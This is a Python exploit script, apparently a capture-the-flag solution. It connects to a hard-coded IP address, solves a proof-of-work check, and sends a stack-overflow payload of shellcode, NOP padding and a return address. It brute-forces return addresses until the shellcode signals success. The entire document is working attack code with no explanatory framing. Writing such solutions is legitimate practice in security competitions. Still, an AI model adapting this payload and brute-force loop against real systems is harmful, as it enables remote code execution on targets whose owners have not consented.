#!/usr/bin/env python3
import re
import socket
import struct
import subprocess
import time

HOST = "5.75.155.137"
PORT = 1338

POW_RE = re.compile(r'unhex\("([0-9a-fA-F]+)" \+ S\)\)\s+ends with\s+(\d+)\s+zero bits')


def recv_until(sock: socket.socket, needle: bytes, max_bytes: int = 2_000_000) -> bytes:
    buf = bytearray()
    while needle not in buf and len(buf) < max_bytes:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return bytes(buf)


def solve_pow(prefix_hex: str, zero_bits: int) -> str:
    p = subprocess.run(
        ["/workspace/chal/pow_solver", prefix_hex, str(zero_bits)],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        timeout=300,
        check=True,
        text=True,
    )
    return p.stdout.strip()


def one_try(pc: int, off: int, sc: bytes) -> bytes:
    payload = sc + b"\x90" * (off - len(sc)) + struct.pack("<I", pc) + b"BBBB"
    s = socket.create_connection((HOST, PORT), timeout=10)
    s.settimeout(10)

    line = recv_until(s, b"\n", max_bytes=10000).decode(errors="replace")
    m = POW_RE.search(line)
    if not m:
        raise RuntimeError("pow parse failed")
    prefix_hex, zero_bits = m.group(1), int(m.group(2))
    sol = solve_pow(prefix_hex, zero_bits)
    s.sendall((sol + "\n").encode())

    # Wait until oracle prompt appears, then send payload
    s.settimeout(2)
    out = recv_until(s, b"Please ask your question", max_bytes=2_000_000)
    s.sendall(payload + b"\n")

    # Read for a short time; if shellcode runs, it should print OK quickly.
    s.settimeout(0.2)
    buf = bytearray()
    t0 = time.time()
    while time.time() - t0 < 2.0 and len(buf) < 200000:
        try:
            ch = s.recv(4096)
        except socket.timeout:
            continue
        if not ch:
            break
        buf += ch
        if b"OK" in buf:
            break
    s.close()
    return bytes(out + buf)


def main() -> int:
    with open("/workspace/chal/sc_ok.bin", "rb") as f:
        sc = f.read()

    off = 168
    start = 0x2000FF00
    end = 0x2000E000
    step = 0x40

    for addr in range(start, end, -step):
        pc = addr | 1
        out = one_try(pc, off, sc)
        if b"OK" in out:
            print(hex(pc))
            return 0
        # crude progress (stderr)
        print(f"tried {hex(pc)}", file=sys.stderr)
    return 1


if __name__ == "__main__":
    import sys
    raise SystemExit(main())

